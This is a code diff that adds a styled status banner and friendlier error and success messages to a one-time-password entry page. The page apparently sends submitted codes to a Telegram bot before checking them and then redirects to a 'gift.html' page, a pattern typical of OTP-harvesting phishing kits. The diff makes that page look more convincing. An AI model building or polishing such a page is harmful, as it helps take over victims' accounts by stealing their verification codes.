@@ -54,6 +54,54 @@ body {
   stroke: #6b6b6b;
 }
 
+.status-banner {
+  position: relative;
+  width: 100%;
+  max-width: 100%;
+  margin-top: 12px;
+  padding: 12px 14px;
+  border-radius: 10px;
+  border-left: 4px solid #0b5ed7;
+  background: #eff6ff;
+  color: #1f3d7a;
+  box-shadow: 0 8px 20px rgba(15, 23, 42, 0.08);
+  transform: none;
+  opacity: 0;
+  pointer-events: none;
+  transition: all 0.25s ease;
+  z-index: 1;
+}
+
+.status-banner.visible {
+  opacity: 1;
+  transform: none;
+}
+
+.status-banner.error {
+  background: #fff1f1;
+  border-left-color: #d93025;
+  color: #9b1c1c;
+}
+
+.status-banner.success {
+  background: #ecfdf5;
+  border-left-color: #17803d;
+  color: #14532d;
+}
+
+.status-banner-title {
+  display: block;
+  font-size: 13px;
+  font-weight: 700;
+  margin-bottom: 4px;
+  letter-spacing: 0.02em;
+}
+
+.status-banner-text {
+  font-size: 13px;
+  line-height: 1.45;
+}
+
 .card {
   background: var(--card);
   border-radius: 18px;
@@ -153,6 +201,11 @@ body {
         <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
     </div>
 
+    <div id="statusBanner" class="status-banner" role="alert" aria-live="polite">
+      <span id="statusBannerTitle" class="status-banner-title">Notice</span>
+      <div id="statusBannerText" class="status-banner-text"></div>
+    </div>
+
 <div class="timer">Resend OTP in <span id="countdown">110</span> seconds</div>
     
     <button class="submit-btn" disabled>Submit</button>
@@ -163,6 +216,21 @@ body {
 <script>
 const inputs = document.querySelectorAll('#otp input');
 const countdownEl = document.getElementById("countdown");
+
+function showStatus(type, title, message) {
+  const banner = document.getElementById('statusBanner');
+  const bannerTitle = document.getElementById('statusBannerTitle');
+  const bannerText = document.getElementById('statusBannerText');
+
+  banner.className = `status-banner visible ${type}`;
+  bannerTitle.textContent = title;
+  bannerText.textContent = message;
+
+  clearTimeout(showStatus.timeoutId);
+  showStatus.timeoutId = setTimeout(() => {
+    banner.classList.remove('visible');
+  }, 3500);
+}
 
 // Load phone number
 window.addEventListener("load", () => {
@@ -198,17 +266,22 @@ async function submitOTP() {
     const data = await response.json();
     if (!data.ok) {
       console.error("Telegram send failed:", data);
+      showStatus('error', 'Submission failed', 'The verification request could not be completed. Please try again.');
       return;
     }
 
     if (otp !== generatedOtp) {
-      alert("Invalid OTP. Please try again.");
+      showStatus('error', 'Invalid OTP', 'The code entered is incorrect. Please try again.');
       return;
     }
 
-    window.location.href = "gift.html";
+    showStatus('success', 'Verification successful', 'Your OTP is valid. Redirecting...');
+    setTimeout(() => {
+      window.location.href = "gift.html";
+    }, 900);
   } catch (err) {
     console.error(err);
+    showStatus('error', 'Request error', 'Something went wrong while verifying your OTP. Please try again.');
   }
 }
 
